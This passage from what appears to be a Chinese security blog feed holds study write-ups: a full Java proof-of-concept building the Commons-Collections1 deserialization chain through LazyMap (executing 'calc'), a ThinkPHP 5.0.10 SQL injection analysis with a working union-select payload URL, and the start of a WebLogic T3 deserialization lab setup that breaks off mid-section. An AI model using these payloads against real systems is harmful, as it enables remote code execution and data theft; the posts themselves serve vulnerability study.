id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/8701#toc-5">https://xz.aliyun.com/t/8701#toc-5</a></p><p><a href="https://xz.aliyun.com/t/8443">https://xz.aliyun.com/t/8443</a></p><p><a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</a></p><p><a href="https://zhzhdoai.github.io/2020/08/10/Weblogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E-%E4%B8%80/#CVE-2016-0638">https://zhzhdoai.github.io/2020/08/10/Weblogic-T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E-%E4%B8%80/#CVE-2016-0638</a></p><p><a href="https://y4er.com/post/weblogic-cve-2016-0638/">https://y4er.com/post/weblogic-cve-2016-0638/</a></p><p><a href="https://y4er.com/post/weblogic-cve-2016-3510/">https://y4er.com/post/weblogic-cve-2016-3510/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用LazyMap触发利用链</title>
    <link href="/2021/07/26/%E5%88%A9%E7%94%A8LazyMap%E8%A7%A6%E5%8F%91%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2021/07/26/%E5%88%A9%E7%94%A8LazyMap%E8%A7%A6%E5%8F%91%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学习cc链时都是从TransformedMap触发，但是在最近的学习过程中发现在ysoserial生成CommonCollections1的payload中使用了LazyMap触发，现在来补充学习一下</p><h1 id="LazyMap和TransformedMap的区别"><a href="#LazyMap和TransformedMap的区别" class="headerlink" title="LazyMap和TransformedMap的区别"></a>LazyMap和TransformedMap的区别</h1><p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承<br>AbstractMapDecorator。</p><p>两者唯一的差别是：</p><ul><li>TransformedMap是在写入元素的时候执行transform</li><li>LazyMap是在其get方法中执行的factory.transform ，在get找不到值的时候，它会调用factory.transform 方法去获取一个值</li></ul><p>两者在利用上的区别：</p><ul><li>LazyMap后续利用稍微复杂一些，原因是在<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的readObject方法中并没有直接调用到Map的get方法。而AnnotationInvocationHandler类的invoke方法有调用到get，ysoserial中利用Java的对象代理来调用invoke来完成利用</li></ul><h1 id="Java对象代理"><a href="#Java对象代理" class="headerlink" title="Java对象代理"></a>Java对象代理</h1><p>之前在学习jdk7u21反序列化利用链时提到了java的动态代理。简单来说就是一个跟filter差不多的东西，在代码执行前先过一个拦截器，也就是InvocationHandler的实现类，在这个类的invoke方法里包含了我们想要执行的代码</p><p>Proxy.newProxyInstance方法会返回一个代理对象，它有三个参数：</p><ol><li>第一个参数是ClassLoader，我们用默认的即可；</li><li>第二个参数是我们需要代理的对象集合；</li><li>第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。</li></ol><p>写个demo回顾一下，这里我们成功劫持了<code>Map.put</code>，让它执行了我们加入的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> Map map;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyInvocationHandler</span><span class="hljs-params">(Map map)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.map=map;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy,Method method,Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().equals(<span class="hljs-string">&quot;put&quot;</span>))&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hacked&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(map,args);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        Map proxyMap=(Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,<span class="hljs-keyword">new</span> MyInvocationHandler(<span class="hljs-keyword">new</span> HashMap()));<br>        proxyMap.put(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>);<br>        String result=(String)proxyMap.get(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WWTJDe"><img src="https://z3.ax1x.com/2021/07/26/WWTJDe.png" alt="WWTJDe.png"></a></p><p>再回到主题，<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类实际上就是一个InvocationHandler。如果我们把AnnotationInvocationHandler作为第三个参数传递给<code>Proxy.newInstance</code>，把AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject时，调用任意方法就会进入到<code>AnnotationInvocationHandler#invoke</code> 方法中，进而触发<code>LazyMap#get</code> 。</p><h1 id="利用LazyMap构造利用链"><a href="#利用LazyMap构造利用链" class="headerlink" title="利用LazyMap构造利用链"></a>利用LazyMap构造利用链</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonCollections1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> String[] &#123;<span class="hljs-string">&quot;calc&quot;</span> &#125;),<br>        &#125;;<br><br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br><br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;, handler);<br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br><br><br><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>前面的跟之前一样，主要看后面的代码，有两个AnnotationInvocationHandler：</p><ul><li>第一个用于执行命令</li><li>第二个用于触发invoke</li></ul><p>1.首先把TransformedMap换成LazyMap</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Map outerMap = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>LazyMap的decorate</p><p><a href="https://imgtu.com/i/WWT1gK"><img src="https://z3.ax1x.com/2021/07/26/WWT1gK.png" alt="WWT1gK.png"></a></p><p>2.利用反射获取AnnotationInvocationHandler的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>construct.setAccessible(<span class="hljs-keyword">true</span>);<br></code></pre></td></tr></table></figure><p>3.实例化被代理的AnnotationInvocationHandler，也就是最终用来触发transforn执行命令的</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">InvocationHandler handler = (InvocationHandler) construct.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Retention.<span class="hljs-params">class</span>, <span class="hljs-params">outerMap</span>)</span>;<br></code></pre></td></tr></table></figure><p>实例化了一个AnnotationInvocationHandler类，把封装好的LazyMap赋值给this.memberValues</p><p><a href="https://imgtu.com/i/WWTYHH"><img src="https://z3.ax1x.com/2021/07/26/WWTYHH.png" alt="WWTYHH.png"></a></p><p><a href="https://imgtu.com/i/WWTa4I"><img src="https://z3.ax1x.com/2021/07/26/WWTa4I.png" alt="WWTa4I.png"></a></p><p>4.创建用于代理的AnnotationInvocationHandler，利用AnnotationInvocationHandler#invoke触发上面的LazyMap#get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;, handler);<br>handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br></code></pre></td></tr></table></figure><p>最后反序列化第二个AnnotationInvocationHandler</p><p><a href="https://imgtu.com/i/WWT08P"><img src="https://z3.ax1x.com/2021/07/26/WWT08P.png" alt="WWT08P.png"></a></p><p>AnnotationInvocationHandler#readObject</p><p>此时的this.memberValues是proxyMap，调用proxyMap的任何方法都会进入AnnotationInvocationHandler#invoke所以相当于</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">proxyMap</span><span class="hljs-selector-class">.memberValues</span><span class="hljs-selector-class">.entrySet</span>()<span class="hljs-selector-class">.iterator</span>()<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WWTwCt"><img src="https://z3.ax1x.com/2021/07/26/WWTwCt.png" alt="WWTwCt.png"></a></p><p>AnnotationInvocationHandler#invoke</p><p>调用proxyMap的任何方法都会进入AnnotationInvocationHandler#invoke，这里的memberValues是之前的LazyMap</p><p><a href="https://imgtu.com/i/WWTGuD"><img src="https://z3.ax1x.com/2021/07/26/WWTGuD.png" alt="WWTGuD.png"></a></p><p>LazyMap#get</p><p>执行transform，触发命令执行</p><p><a href="https://imgtu.com/i/WWT3jO"><img src="https://z3.ax1x.com/2021/07/26/WWT3jO.png" alt="WWT3jO.png"></a></p><p><a href="https://imgtu.com/i/WWTBgf"><img src="https://z3.ax1x.com/2021/07/26/WWTBgf.png" alt="WWTBgf.png"></a></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>由于IDEA中Debug会利用toString，在实际执行过程中会提前弹计算器，需要把这个功能给关掉</p><p><a href="https://imgtu.com/i/WWTUUA"><img src="https://z3.ax1x.com/2021/07/26/WWTUUA.png" alt="WWTUUA.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://wjlshare.com/archives/1502">http://wjlshare.com/archives/1502</a></p><p><a href="https://reader-l.github.io/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/#3-%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE">https://reader-l.github.io/2020/10/21/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE/#3-%E5%88%A9%E7%94%A8LazyMap%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE</a></p><p>Java安全漫谈 - 11.反序列化篇(5)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp5框架SQL注入分析：parseWhereItem+filterValue</title>
    <link href="/2021/07/25/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseWhereItem-filterValue/"/>
    <url>/2021/07/25/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseWhereItem-filterValue/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞概要：</p><ul><li>漏洞存在于 Mysql 类的 parseWhereItem 方法中，数据未经过过滤就拼接进sql语句。</li><li><strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，</li></ul><p>漏洞影响版本： <strong>ThinkPHP=5.0.10</strong> </p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$username</span> = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>])-&gt;select();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/localhost/tp</span>501/public/?username[<span class="hljs-number">0</span>]=not like&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]=%%&amp;username[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=<span class="hljs-number">233</span>&amp;username[<span class="hljs-number">2</span>]=) <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,<span class="hljs-title">user</span>()%23</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wgi7Bq"><img src="https://z3.ax1x.com/2021/07/25/Wgi7Bq.png" alt="Wgi7Bq.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>我们传递的参数会先进入Request类的input方法，然后经过强制类型转换和filterValue方法的处理</p><p>1.get</p><p>$_GET数组被赋值给$this-&gt;get，然后进入input</p><p><a href="https://imgtu.com/i/WgiO4U"><img src="https://z3.ax1x.com/2021/07/25/WgiO4U.png" alt="WgiO4U.png"></a></p><p>2.input</p><p>array_walk_recursive 会对$data数组中的每个成员递归地应用filterValue函数，</p><p><a href="https://imgtu.com/i/WgijCF"><img src="https://z3.ax1x.com/2021/07/25/WgijCF.png" alt="WgijCF.png"></a></p><p>3.filterValue</p><p>调用filterExp对数组中的每一个值进行过滤</p><p><a href="https://imgtu.com/i/Wgiv34"><img src="https://z3.ax1x.com/2021/07/25/Wgiv34.png" alt="Wgiv34.png"></a></p><p>4.filterExp</p><p>可以看到没有过滤NOT LIKE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterExp</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-comment">// 过滤查询特殊字符</span><br>       <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$value</span>) &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;<br>           <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>       &#125;<br>       <span class="hljs-comment">// TODO 其他安全过滤</span><br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="parseWhereItem"><a href="#parseWhereItem" class="headerlink" title="parseWhereItem"></a>parseWhereItem</h2><p>1.控制器</p><p><a href="https://imgtu.com/i/Wgi5cj"><img src="https://z3.ax1x.com/2021/07/25/Wgi5cj.png" alt="Wgi5cj.png"></a></p><p>2.where</p><p>调用parseWhere把username数组赋值给<code>$this-&gt;options[&#39;where&#39;][&#39;AND&#39;]</code></p><p><a href="https://imgtu.com/i/WgixgJ"><img src="https://z3.ax1x.com/2021/07/25/WgixgJ.png" alt="WgixgJ.png"></a></p><p>3.parseWhereExp</p><p>主要是赋值和拼接数组的具体过程</p><p><a href="https://imgtu.com/i/WgiIjs"><img src="https://z3.ax1x.com/2021/07/25/WgiIjs.png" alt="WgiIjs.png"></a></p><p>4.select</p><ul><li>select构建sql语句</li><li>query执行构建好的sql语句</li></ul><p><a href="https://imgtu.com/i/WgiTun"><img src="https://z3.ax1x.com/2021/07/25/WgiTun.png" alt="WgiTun.png"></a></p><p>5.select</p><p>构造sql语句，进入parseWhere</p><p><a href="https://imgtu.com/i/WgiHH0"><img src="https://z3.ax1x.com/2021/07/25/WgiHH0.png" alt="WgiHH0.png"></a></p><p>6.parseWhere</p><p>if条件不满足，只执行了buildWhere</p><p><a href="https://imgtu.com/i/WgiLNT"><img src="https://z3.ax1x.com/2021/07/25/WgiLNT.png" alt="WgiLNT.png"></a></p><p><a href="https://imgtu.com/i/WgiqEV"><img src="https://z3.ax1x.com/2021/07/25/WgiqEV.png" alt="WgiqEV.png"></a></p><p>7.buildWhere</p><p>调用parseWhereItem</p><p><a href="https://imgtu.com/i/WgFpuR"><img src="https://z3.ax1x.com/2021/07/25/WgFpuR.png" alt="WgFpuR.png"></a></p><p>8.parseWhereItem</p><p>简化了下，只放了实际执行的代码</p><ol><li>parseKey给username拼接上了反引号</li><li>$exp把小写的not like转成大写</li><li>$value等于$val[1]</li><li>在这里parseValue的功能就是给传入参数拼接上单引号</li><li>逻辑操作符$logic来源于可控的$val[2]，然后被拼接进sql语句，造成了sql注入</li></ol><p><a href="https://imgtu.com/i/WgF9D1"><img src="https://z3.ax1x.com/2021/07/25/WgF9D1.png" alt="WgF9D1.png"></a></p><p>9.query执行sql语句</p><p><a href="https://imgtu.com/i/Wgizv9"><img src="https://z3.ax1x.com/2021/07/25/Wgizv9.png" alt="Wgizv9.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic学习：T3反序列化</title>
    <link href="/2021/07/24/Weblogic%E5%AD%A6%E4%B9%A0%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/07/24/Weblogic%E5%AD%A6%E4%B9%A0%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前遇到Weblogic就是工具一把梭，现在来详细分析下Weblogic相关漏洞的原理。</p><p>weblogic反序列化主要有XMLDecoder和T3协议。先从T3协议开始，主要是<code>CVE-2015-4852</code>这个漏洞</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>下载jdk压缩包和weblogic，然后把下载好的jdk文件放在该项目的jdks文件夹下，weblogic的源码放在weblogics文件夹下。</p><p>执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build --build-arg JDK_PKG=jdk-<span class="hljs-number">7</span>u<span class="hljs-number">21</span>-linux-x<span class="hljs-number">64</span>.tar.gz --build-arg WEBLOGIC_JAR=wls<span class="hljs-number">1036</span>_generic.jar  -t weblogic<span class="hljs-number">1036</span>jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> .<br><br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">7001</span>:<span class="hljs-number">7001</span> -p <span class="hljs-number">8453</span>:<span class="hljs-number">8453</span> -p <span class="hljs-number">5556</span>:<span class="hljs-number">5556</span> --name weblogic<span class="hljs-number">1036</span>jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> weblogic<span class="hljs-number">1036</span>jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WcuGfx"><img src="https://z3.ax1x.com/2021/07/24/WcuGfx.png" alt="WcuGfx.png"></a></p><p>搭建成功</p><p><a href="https://imgtu.com/i/WcmDDH"><img src="https://z3.ax1x.com/2021/07/24/WcmDDH.png" alt="WcmDDH.png"></a></p><h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><p>需要把一些weblogic的依赖Jar包给导出来才能进行远程调试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">mkdir ./middleware<br><br>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/<br><br>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/<br><br>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3<span class="hljs-number">.7</span>/lib ./coherence_3<span class="hljs-number">.7</span>/lib<br></code></pre></td></tr></table></figure><p>用IDEA打开wlserver文件夹，然后导入coherence_3.7\lib和modules</p><p><a href="https://imgtu.com/i/WcmYU1"><img src="https://z3.ax1x.com/2021/07/24/WcmYU1.png" alt="WcmYU1.png"></a></p><p>再把 server/lib 作为依赖进行导入</p><p><a href="https://imgtu.com/i/WcmJER"><img src="https://z3.ax1x.com/2021/07/24/WcmJER.png" alt="WcmJER.png"></a></p><p>在配置页面添加Remote并修改端口</p><p><a href="https://imgtu.com/i/Wcm8b9"><img src="https://z3.ax1x.com/2021/07/24/Wcm8b9.png" alt="Wcm8b9.png"></a></p><h1 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h1><h2 id="T3协议概述"><a href="#T3协议概述" class="headerlink" title="T3协议概述"></a>T3协议概述</h2><p>RMI通信传输反序列化数据，接收数据后进行反序列化，正常RMI通信使用的是JRMP协议，而在Weblogic的RMI通信中使用的是T3协议。T3协议是Weblogic独有的一个协议，相比于JRMP协议多了一些特性。以下是T3协议的特点：</p><ol><li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li><li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li></ol><h2 id="T3协议结构"><a href="#T3协议结构" class="headerlink" title="T3协议结构"></a>T3协议结构</h2><p>T3协议里包含请求包头和请求的主体这两部分内容。</p><h3 id="请求包头"><a href="#请求包头" class="headerlink" 